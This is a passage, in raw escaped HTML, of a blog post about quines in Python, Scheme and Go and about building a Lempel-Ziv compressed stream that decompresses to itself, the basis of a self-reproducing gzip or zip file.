href=&#34;http://swtch.com/r.tar.gz&#34;&gt;&lt;code&gt;r.tar.gz&lt;/code&gt;&lt;/a&gt; is&#xA;gzipped tar files all the way down.)&#xA;Like the line of shopping carts, it never ends,&#xA;because it loops back onto itself: the zip file contains itself!&#xA;And it&#39;s probably less work to put together a self-reproducing zip file&#xA;than to put together all those shopping carts,&#xA;at least if you&#39;re the kind of person who would read this blog.&#xA;This post explains how.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Before we get to self-reproducing zip files, though,&#xA;we need to take a brief detour into self-reproducing programs.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;h3&gt;Self-reproducing programs&lt;/h3&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The idea of self-reproducing programs dates back to the 1960s.&#xA;My favorite statement of the problem is the one Ken Thompson gave in his 1983 Turing Award address:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;p class=pp&gt;&#xA;In college, before video games, we would amuse ourselves by posing programming exercises. One of the favorites was to write the shortest self-reproducing program. Since this is an exercise divorced from reality, the usual vehicle was FORTRAN. Actually, FORTRAN was the language of choice for the same reason that three-legged races are popular.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;More precisely stated, the problem is to write a source program that, when compiled and executed, will produce as output an exact copy of its source. If you have never done this, I urge you to try it on your own. The discovery of how to do it is a revelation that far surpasses any benefit obtained by being told how to do it. The part about &amp;ldquo;shortest&amp;rdquo; was just an incentive to demonstrate skill and determine a winner.&#xA;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;&lt;b&gt;Spoiler alert!&lt;/b&gt;&#xA;I agree: if you have never done this, I urge you to try it on your own.&#xA;The internet makes it so easy to look things up that it&#39;s refreshing&#xA;to discover something yourself once in a while.&#xA;Go ahead and spend a few days figuring out.  This blog will still be here&#xA;when you get back.&#xA;(If you don&#39;t mind the spoilers, the entire &lt;a href=&#34;http://cm.bell-labs.com/who/ken/trust.html&#34;&gt;Turing award address&lt;/a&gt; is worth reading.)&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;br&gt;&lt;br&gt;&#xA;&lt;i&gt;(Spoiler blocker.)&lt;/i&gt;&#xA;&lt;br&gt;&#xA;&lt;a href=&#34;http://www.robertwechsler.com/projects.html&#34;&gt;&lt;img src=&#34;http://research.swtch.com/applied_geometry.jpg&#34;&gt;&lt;/a&gt;&#xA;&lt;br&gt;&#xA;&lt;i&gt;&lt;a href=&#34;http://www.robertwechsler.com/projects.html&#34;&gt;http://www.robertwechsler.com/projects.html&lt;/a&gt;&lt;/i&gt;&#xA;&lt;br&gt;&lt;br&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Let&#39;s try to write a Python program that prints itself.&#xA;It will probably be a &lt;code&gt;print&lt;/code&gt; statement, so here&#39;s a first attempt,&#xA;run at the interpreter prompt:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=indent&gt;&#xA;&amp;gt;&amp;gt;&amp;gt; print &#39;&lt;span style=&#34;color: #005500&#34;&gt;hello&lt;/span&gt;&#39;&#xA;hello&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;That didn&#39;t quite work.  But now we know what the program is, so let&#39;s print it:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=indent&gt;&#xA;&amp;gt;&amp;gt;&amp;gt; print &#34;&lt;span style=&#34;color: #005500&#34;&gt;print &#39;hello&#39;&lt;/span&gt;&#34;&#xA;print &#39;hello&#39;&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;That didn&#39;t quite work either.  The problem is that when you execute&#xA;a simple print statement, it only prints part of itself: the argument to the print.&#xA;We need a way to print the rest of the program too.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The trick is to use recursion: you write a string that is the whole program,&#xA;but with itself missing, and then you plug it into itself before passing it to print.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=indent&gt;&#xA;&amp;gt;&amp;gt;&amp;gt; s = &#39;&lt;span style=&#34;color: #005500&#34;&gt;print %s&lt;/span&gt;&#39;; print s % repr(s)&#xA;print &#39;print %s&#39;&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Not quite, but closer: the problem is that the string &lt;code&gt;s&lt;/code&gt; isn&#39;t actually&#xA;the program.  But now we know the general form of the program:&#xA;&lt;code&gt;s = &#39;&lt;span style=&#34;color: #005500&#34;&gt;%s&lt;/span&gt;&#39;; print s % repr(s)&lt;/code&gt;.&#xA;That&#39;s the string to use.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;pre class=indent&gt;&#xA;&amp;gt;&amp;gt;&amp;gt; s = &#39;&lt;span style=&#34;color: #005500&#34;&gt;s = %s; print s %% repr(s)&lt;/span&gt;&#39;; print s % repr(s)&#xA;s = &#39;s = %s; print s %% repr(s)&#39;; print s % repr(s)&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;Recursion for the win.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;This form of self-reproducing program is often called a &lt;a href=&#34;http://en.wikipedia.org/wiki/Quine_(computing)&#34;&gt;quine&lt;/a&gt;,&#xA;in honor of the philosopher and logician W. V. O. Quine,&#xA;who discovered the paradoxical sentence:&#xA;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&amp;ldquo;Yields falsehood when preceded by its quotation&amp;rdquo;&lt;br&gt;yields falsehood when preceded by its quotation.&#xA;&lt;/blockquote&gt;&#xA;&lt;p class=lp&gt;&#xA;The simplest English form of a self-reproducing quine is a command like:&#xA;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;Print this, followed by its quotation:&lt;br&gt;&amp;ldquo;Print this, followed by its quotation:&amp;rdquo;&#xA;&lt;/blockquote&gt;&#xA;&lt;p class=lp&gt;&#xA;There&#39;s nothing particularly special about Python that makes quining possible.&#xA;The most elegant quine I know is a Scheme program that is a direct, if somewhat inscrutable, translation of that&#xA;sentiment:&#xA;&lt;/p&gt;&#xA;&lt;pre class=indent&gt;&#xA;((lambda (x) `&lt;span style=&#34;color: #005500&#34;&gt;(&lt;/span&gt;,x &lt;span style=&#34;color: #005500&#34;&gt;&#39;&lt;/span&gt;,x&lt;span style=&#34;color: #005500&#34;&gt;)&lt;/span&gt;)&#xA;&#39;&lt;span style=&#34;color: #005500&#34;&gt;(lambda (x) `(,x &#39;,x))&lt;/span&gt;)&#xA;&lt;/pre&gt;&#xA;&lt;p class=lp&gt;&#xA;I think the Go version is a clearer translation, at least as far as the quoting is concerned:&#xA;&lt;/p&gt;&#xA;&lt;pre class=indent&gt;&#xA;/* Go quine */&#xA;package main&#xA;import &#34;&lt;span style=&#34;color: #005500&#34;&gt;fmt&lt;/span&gt;&#34;&#xA;func main() {&#xA; fmt.Printf(&#34;&lt;span style=&#34;color: #005500&#34;&gt;%s%c%s%c\n&lt;/span&gt;&#34;, q, 0x60, q, 0x60)&#xA;}&#xA;var q = `&lt;span style=&#34;color: #005500&#34;&gt;/* Go quine */&#xA;package main&#xA;import &#34;fmt&#34;&#xA;func main() {&#xA; fmt.Printf(&#34;%s%c%s%c\n&#34;, q, 0x60, q, 0x60)&#xA;}&#xA;var q = &lt;/span&gt;`&#xA;&lt;/pre&gt;&#xA;&lt;p class=lp&gt;(I&#39;ve colored the data literals green throughout to make it clear what is program and what is data.)&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;The Go program has the interesting property that, ignoring the pesky newline&#xA;at the end, the entire program is the same thing twice (&lt;code&gt;/* Go quine */ ... q = `&lt;/code&gt;).&#xA;That got me thinking: maybe it&#39;s possible to write a self-reproducing program&#xA;using only a repetition operator.&#xA;And you know what programming language has essentially only a repetition operator?&#xA;The language used to encode Lempel-Ziv compressed files&#xA;like the ones used by &lt;code&gt;gzip&lt;/code&gt; and &lt;code&gt;zip&lt;/code&gt;.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;h3&gt;Self-reproducing Lempel-Ziv programs&lt;/h3&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Lempel-Ziv compressed data is a stream of instructions with two basic&#xA;opcodes: &lt;code&gt;literal(&lt;/code&gt;&lt;i&gt;n&lt;/i&gt;&lt;code&gt;)&lt;/code&gt; followed by&#xA;&lt;i&gt;n&lt;/i&gt; bytes of data means write those &lt;i&gt;n&lt;/i&gt; bytes into the&#xA;decompressed output,&#xA;and &lt;code&gt;repeat(&lt;/code&gt;&lt;i&gt;d&lt;/i&gt;&lt;code&gt;,&lt;/code&gt; &lt;i&gt;n&lt;/i&gt;&lt;code&gt;)&lt;/code&gt;&#xA;means look backward &lt;i&gt;d&lt;/i&gt; bytes from the current location&#xA;in the decompressed output and copy the &lt;i&gt;n&lt;/i&gt; bytes you find there&#xA;into the output stream.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The programming exercise, then, is this: write a Lempel-Ziv program&#xA;using just those two opcodes that prints itself when run.&#xA;In other words, write a compressed data stream that decompresses to itself.&#xA;Feel free to assume any reasonable encoding for the &lt;code&gt;literal&lt;/code&gt;&#xA;and &lt;code&gt;repeat&lt;/code&gt; opcodes.&#xA;For the grand prize, find a program that decompresses to&#xA;itself surrounded by an arbitrary prefix and suffix,&#xA;so that the sequence could be embedded in an actual &lt;code&gt;gzip&lt;/code&gt;&#xA;or &lt;code&gt;zip&lt;/code&gt; file, which has a fixed-format header and trailer.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;&lt;b&gt;Spoiler alert!&lt;/b&gt;&#xA;I urge you to try this on your own before continuing to read.&#xA;It&#39;s a great way to spend a lazy afternoon, and you have&#xA;one critical advantage that I didn&#39;t: you know there is a solution.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;center&gt;&#xA;&lt;br&gt;&lt;br&gt;&#xA;&lt;i&gt;(Spoiler blocker.)&lt;/i&gt;&#xA;&lt;br&gt;&#xA;&lt;a href=&#34;&#34;&gt;&lt;img src=&#34;http://research.swtch.com/the_best_circular_bike(sbcc_sbma_students_roof).jpg&#34;&gt;&lt;/a&gt;&#xA;&lt;br&gt;&#xA;&lt;i&gt;&lt;a href=&#34;http://www.robertwechsler.com/thebest.html&#34;&gt;http://www.robertwechsler.com/thebest.html&lt;/a&gt;&lt;/i&gt;&#xA;&lt;br&gt;&lt;br&gt;&#xA;&lt;/center&gt;&#xA;&#xA;&lt;p class=lp&gt;By the way, here&#39;s &lt;a href=&#34;http://swtch.com/r.gz&#34;&gt;&lt;code&gt;r.gz&lt;/code&gt;&lt;/a&gt;, gzip files all the way down.&#xA;&#xA;&lt;pre class=indent&gt;&#xA;$ gunzip &amp;lt; r.gz &amp;gt; r&#xA;$ cmp r r.gz&#xA;$&#xA;&lt;/pre&gt;&#xA;&#xA;&lt;p class=lp&gt;The nice thing about &lt;code&gt;r.gz&lt;/code&gt; is that even broken web browsers&#xA;that ordinarily decompress downloaded gzip data before storing it to disk&#xA;will handle this file correctly!&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;Enough stalling to hide the spoilers.&#xA;Let&#39;s use this shorthand to describe Lempel-Ziv instructions:&#xA;&lt;code&gt;L&lt;/code&gt;&lt;i&gt;n&lt;/i&gt; and &lt;code&gt;R&lt;/code&gt;&lt;i&gt;n&lt;/i&gt; are&#xA;shorthand for &lt;code&gt;literal(&lt;/code&gt;&lt;i&gt;n&lt;/i&gt;&lt;code&gt;)&lt;/code&gt; and&#xA;&lt;code&gt;repeat(&lt;/code&gt;&lt;i&gt;n&lt;/i&gt;&lt;code&gt;,&lt;/code&gt; &lt;i&gt;n&lt;/i&gt;&lt;code&gt;)&lt;/code&gt;,&#xA;and the program assumes that each code is one byte.&#xA;&lt;code&gt;L0&lt;/code&gt; is therefore the Lempel-Ziv no-op;&#xA;&lt;code&gt;L5&lt;/code&gt; &lt;code&gt;hello&lt;/code&gt; prints &lt;code&gt;hello&lt;/code&gt;;&#xA;and so does &lt;code&gt;L3&lt;/code&gt; &lt;code&gt;hel&lt;/code&gt; &lt;code&gt;R1&lt;/code&gt; &lt;code&gt;L1&lt;/code&gt; &lt;code&gt;o&lt;/code&gt;.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Here&#39;s a Lempel-Ziv program that prints itself.&#xA;(Each line is one instruction.)&#xA;&lt;/p&gt;&#xA;&#xA;&lt;br&gt;&#xA;&lt;center&gt;&#xA;&lt;table border=0&gt;&#xA;&lt;tr&gt;&lt;th&gt;&lt;/th&gt;&lt;th width=30&gt;&lt;/th&gt;&lt;th&gt;Code&lt;/th&gt;&lt;th width=30&gt;&lt;/th&gt;&lt;th&gt;Output&lt;/th&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;no-op&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L0&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;no-op&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L0&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;no-op&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L0&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print 4 bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L4 &lt;span style=&#34;color: #005500&#34;&gt;L0 L0 L0 L4&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L0 L0 L0 L4&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;repeat last 4 printed bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L0 L0 L0 L4&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print 4 bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L4 &lt;span style=&#34;color: #005500&#34;&gt;R4 L4 R4 L4&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4 L4 R4 L4&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;repeat last 4 printed bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4 L4 R4 L4&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print 4 bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L4 &lt;span style=&#34;color: #005500&#34;&gt;L0 L0 L0 L0&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L0 L0 L0 L0&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&lt;br&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;(The two columns Code and Output contain the same byte sequence.)&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The interesting core of this program is the 6-byte sequence&#xA;&lt;code&gt;L4 R4 L4 R4 L4 R4&lt;/code&gt;, which prints the 8-byte sequence &lt;code&gt;R4 L4 R4 L4 R4 L4 R4 L4&lt;/code&gt;.&#xA;That is, it prints itself with an extra byte before and after.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;When we were trying to write the self-reproducing Python program,&#xA;the basic problem was that the print statement was always longer&#xA;than what it printed.  We solved that problem with recursion,&#xA;computing the string to print by plugging it into itself.&#xA;Here we took a different approach.&#xA;The Lempel-Ziv program is&#xA;particularly repetitive, so that a repeated substring ends up&#xA;containing the entire fragment.  The recursion is in the&#xA;representation of the program rather than its execution.&#xA;Either way, that fragment is the crucial point.&#xA;Before the final &lt;code&gt;R4&lt;/code&gt;, the output lags behind the input.&#xA;Once it executes, the output is one code ahead.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;The &lt;code&gt;L0&lt;/code&gt; no-ops are plugged into&#xA;a more general variant of the program, which can reproduce itself&#xA;with the addition of an arbitrary three-byte prefix and suffix:&#xA;&lt;/p&gt;&#xA;&#xA;&lt;br&gt;&#xA;&lt;center&gt;&#xA;&lt;table border=0&gt;&#xA;&lt;tr&gt;&lt;th&gt;&lt;/th&gt;&lt;th width=30&gt;&lt;/th&gt;&lt;th&gt;Code&lt;/th&gt;&lt;th width=30&gt;&lt;/th&gt;&lt;th&gt;Output&lt;/th&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print 4 bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L4 &lt;span style=&#34;color: #005500&#34;&gt;&lt;i&gt;aa bb cc&lt;/i&gt; L4&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;i&gt;aa bb cc&lt;/i&gt; L4&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;repeat last 4 printed bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;i&gt;aa bb cc&lt;/i&gt; L4&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print 4 bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L4 &lt;span style=&#34;color: #005500&#34;&gt;R4 L4 R4 L4&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4 L4 R4 L4&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;repeat last 4 printed bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4 L4 R4 L4&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print 4 bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;L4 &lt;span style=&#34;color: #005500&#34;&gt;R4 &lt;i&gt;xx yy zz&lt;/i&gt;&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4 &lt;i&gt;xx yy zz&lt;/i&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;repeat last 4 printed bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;R4 &lt;i&gt;xx yy zz&lt;/i&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&#xA;&lt;/table&gt;&#xA;&lt;/center&gt;&#xA;&lt;br&gt;&#xA;&#xA;&lt;p class=lp&gt;&#xA;(The byte sequence in the Output column is &lt;code&gt;&lt;i&gt;aa bb cc&lt;/i&gt;&lt;/code&gt;, then&#xA;the byte sequence from the Code column, then &lt;code&gt;&lt;i&gt;xx yy zz&lt;/i&gt;&lt;/code&gt;.)&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;It took me the better part of a quiet Sunday to get this far,&#xA;but by the time I got here I knew the game was over&#xA;and that I&#39;d won.&#xA;From all that experimenting, I knew it was easy to create&#xA;a program fragment that printed itself minus a few instructions&#xA;or even one that printed an arbitrary prefix&#xA;and then itself, minus a few instructions.&#xA;The extra &lt;code&gt;aa bb cc&lt;/code&gt; in the output&#xA;provides a place to attach such a program fragment.&#xA;Similarly, it&#39;s easy to create a fragment to attach&#xA;to the &lt;code&gt;xx yy zz&lt;/code&gt; that prints itself,&#xA;minus the first three instructions, plus an arbitrary suffix.&#xA;We can use that generality to attach an appropriate&#xA;header and trailer.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;p class=pp&gt;&#xA;Here is the final program, which prints itself surrounded by an&#xA;arbitrary prefix and suffix.&#xA;&lt;code&gt;[P]&lt;/code&gt; denotes the &lt;i&gt;p&lt;/i&gt;-byte compressed form of the prefix &lt;code&gt;P&lt;/code&gt;;&#xA;similarly, &lt;code&gt;[S]&lt;/code&gt; denotes the &lt;i&gt;s&lt;/i&gt;-byte compressed form of the suffix &lt;code&gt;S&lt;/code&gt;.&#xA;&lt;/p&gt;&#xA;&#xA;&lt;br&gt;&#xA;&lt;center&gt;&#xA;&lt;table border=0&gt;&#xA;&lt;tr&gt;&lt;th&gt;&lt;/th&gt;&lt;th width=30&gt;&lt;/th&gt;&lt;th&gt;Code&lt;/th&gt;&lt;th width=30&gt;&lt;/th&gt;&lt;th&gt;Output&lt;/th&gt;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print prefix&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;[P]&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;P&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;print &lt;/i&gt;p&lt;i&gt;+1 bytes&lt;/i&gt;&lt;/span&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;L&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt; &lt;span style=&#34;color: #005500&#34;&gt;[P] L&lt;/span&gt;&lt;/code&gt;&lt;span style=&#34;color: #005500&#34;&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt;&lt;/span&gt;&lt;code&gt;&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;[P] L&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt;&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;repeat last &lt;/i&gt;p&lt;i&gt;+1 printed bytes&lt;/i&gt;&lt;/span&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt;&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;[P] L&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt;&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;print 1 byte&lt;/i&gt;&lt;/span&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;L1 &lt;span style=&#34;color: #005500&#34;&gt;R&lt;/span&gt;&lt;/code&gt;&lt;span style=&#34;color: #005500&#34;&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt;&lt;/span&gt;&lt;code&gt;&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt;&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;print 1 byte&lt;/i&gt;&lt;/span&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;L1 &lt;span style=&#34;color: #005500&#34;&gt;L1&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;L1&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;print 4 bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;L4 &lt;span style=&#34;color: #005500&#34;&gt;R&lt;/span&gt;&lt;/code&gt;&lt;span style=&#34;color: #005500&#34;&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt;&lt;/span&gt;&lt;code&gt;&lt;span style=&#34;color: #005500&#34;&gt; L1 L1 L4&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;&lt;i&gt;p&lt;/i&gt;+1&lt;/span&gt;&lt;code&gt; L1 L1 L4&lt;/code&gt;&lt;/td&gt;&#xA;&lt;/tr&gt;&#xA;&lt;tr&gt;&#xA; &lt;td align=right&gt;&lt;i&gt;&lt;span style=&#34;font-size: 0.8em;&#34;&gt;repeat last 4 printed bytes&lt;/span&gt;&lt;/i&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R4&lt;/code&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;/td&gt;&#xA; &lt;td&gt;&lt;code&gt;R&lt;/code&gt;&lt;span style=&#34;font-size: 